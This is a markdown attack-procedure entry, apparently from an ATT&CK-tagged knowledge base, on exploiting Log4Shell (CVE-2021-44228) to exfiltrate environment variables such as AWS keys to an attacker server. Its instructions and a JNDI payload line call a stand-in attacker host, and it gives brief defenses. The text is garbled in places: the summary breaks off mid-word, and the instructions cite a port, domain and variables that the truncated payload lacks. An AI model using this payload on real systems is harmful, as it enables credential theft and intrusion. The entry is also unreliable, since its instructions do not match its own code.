---
id: 52ac943f-4372-47db-a2c9-ad6466d328c9
name: Log4Shell Environment Variables Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:56.566827+00:00'
updated_at: '2023-04-06T03:55:56.577295+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Data from Local System|T1005 - Data from Local System]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Phishing|T1566 - Phishing]]'
sub_techniques:
- '[[Spearphishing Link|T1566.002 - Spearphishing Link]]'
tags:
- '[[CVE-2021-44228 Log4Shell]]'
- '[[Environment variables exfiltration]]'
- '[[Exploitation]]'
---

# Log4Shell Environment Variables Exfiltration

## Summary

Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to execute arbitrary code remotely. This specific procedure focuses on exfiltrating environment variables through exploiting the vulnerability. By sending a specially crafted JNDI request, an attacker can access the environ

## Description

# Description

Log4Shell is a critical vulnerability in Apache Log4j that allows attackers to execute arbitrary code remotely. This specific procedure focuses on exfiltrating environment variables through exploiting the vulnerability. By sending a specially crafted JNDI request, an attacker can access the environment variables of the targeted system and exfiltrate them to a remote server controlled by the attacker. This can provide valuable information such as AWS access keys or other sensitive information stored in environment variables. The technical explanation involves sending a JNDI request to the targeted system and retrieving the environment variables. The business value is that this can provide an attacker with sensitive information that can be used for further attacks or sold on the dark web.

 

## Requirements

1. Access to a system with the Log4Shell vulnerability

1. Ability to send JNDI requests to the targeted system

1. Access to a remote server controlled by the attacker to exfiltrate the environment variables

 

## Defense

1. Patch the Log4j vulnerability as soon as possible

1. Implement network segmentation to limit the impact of a potential Log4Shell attack

1. Monitor network traffic for any suspicious JNDI requests

 

## Objectives

1. Exfiltrate environment variables from a targeted system

1. Obtain sensitive information such as AWS access keys

 

# Instructions

1. 1. Replace the attacker-controlled server address 'attacker.com' with your own domain.
2. Replace the '1389' port number with the port number you want to use.
3. Replace 'AWS_ACCESS_KEY_ID' and 'AWS_SECRET_ACCESS_KEY' with the environment variables you want to exfiltrate.
4. Run the command.

 



**Code**: [[${jndi:ldap://${env:USER}.${env:USERNAME}.attacker]]



> This command sends a JNDI request to the targeted system and retrieves the environment variables specified in the command. The environment variables are then exfiltrated to the attacker-controlled server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Data from Local System|T1005 - Data from Local System]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Phishing|T1566 - Phishing]]

### Sub-Techniques

- [[Spearphishing Link|T1566.002 - Spearphishing Link]]

## Tags

- [[CVE-2021-44228 Log4Shell]]
- [[Environment variables exfiltration]]
- [[Exploitation]]


